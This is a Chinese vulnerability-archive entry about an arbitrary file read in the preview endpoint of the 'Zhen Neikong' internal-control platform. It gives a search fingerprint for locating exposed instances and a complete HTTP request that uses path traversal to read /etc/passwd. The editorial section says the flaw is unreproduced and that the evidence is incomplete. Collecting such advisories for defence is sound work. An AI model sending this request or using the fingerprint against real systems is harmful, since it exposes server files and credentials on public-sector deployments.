---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "真内控国产化平台preview存在任意文件读取漏洞"
product: "真内控国产化Web平台"
record_type: "vulnerability"
document_type: "请求级漏洞摘要"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "billPdf preview urlPath遍历；版本、认证、进程权限未列"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/%E7%9C%9F%E5%86%85%E6%8E%A7%E5%9B%BD%E4%BA%A7%E5%8C%96%E5%B9%B3%E5%8F%B0/%E7%9C%9F%E5%86%85%E6%8E%A7%E5%9B%BD%E4%BA%A7%E5%8C%96%E5%B9%B3%E5%8F%B0preview%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/um00s8xep779vpgx"
id: "vw-0a26bfeb28aebe147889dc71"
entity_id: "ve-0a26bfeb28aebe147889dc71"
schema_version: "1"
---

# 真内控国产化平台preview存在任意文件读取漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：真内控国产化Web平台
- 文献类型：请求级漏洞摘要
- 版本、权限及部署边界：billPdf preview urlPath遍历；版本、认证、进程权限未列
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 桌面分类错误，影响版本仅名称，ECharts通用资源指纹不能充分识别厂商
2. Host为空且HTTP围栏标java，无原始响应/源码与修复，不能仅URL确证任意读
3. 任意文件受权限限制，补Linux测试环境与路径规范化规则；保留语雀来源

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/um00s8xep779vpgx>
- 原文参考链接（未重新核验）：<https://github.com/wy876/POC>

### 归档技术正文

# 一、漏洞简介
真内控国产化平台是基于国产可控技术开发的内部控制管理咨询及信息化服务平台。该平台涵盖了预算绩效、支出管理、采购管理、合同管理、资产管理、基建项目管理等多个模块，为公共部门（包括政府部门、科研机构、学校、医院等）提供全方位的经济活动内部控制解决方案。真内控国产化平台 preview接口存在一个任意文件读取漏洞，攻击者可以通过构造精心设计的请求，成功利用漏洞读取服务器上的任意文件，包括敏感系统文件和应用程序配置文件等。通过利用此漏洞，攻击者可能获得系统内的敏感信息，导致潜在的信息泄露风险。

# 二、影响版本
真内控国产化平台

# 三、资产测绘
```plain
body="js/npm.echarts.js"
```


# 四、漏洞复现
```http
GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd  HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/um00s8xep779vpgx>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
